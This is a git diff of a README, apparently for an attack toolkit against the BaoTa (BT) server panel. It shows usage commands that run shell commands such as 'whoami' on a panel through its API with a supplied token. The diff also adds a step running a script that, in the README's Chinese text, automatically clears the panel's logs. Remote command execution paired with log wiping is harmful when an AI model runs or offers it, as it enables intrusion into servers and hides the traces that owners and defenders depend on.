@@ -88,7 +88,7 @@ python3 .\bt_panel_script.py
 
 ![](imgs/03.png)
 
-```
+```bash
 python3 .\bt_panel_api.py -g
 ```
 
@@ -96,8 +96,14 @@ python3 .\bt_panel_api.py -g
 
 ![](imgs/04.png)
 
-```
+```bash
 python3 .\bt_panel_api.py -u "http://192.168.101.5:8888/" -t "085bd64a698cf601ae472425656b2346" -c whoami
 ```
 
 ![](imgs/05.png)
+
+```bash
+python3 .\bt_panel_log_delete.py
+```
+
+这个脚本可以自动清理面板日志
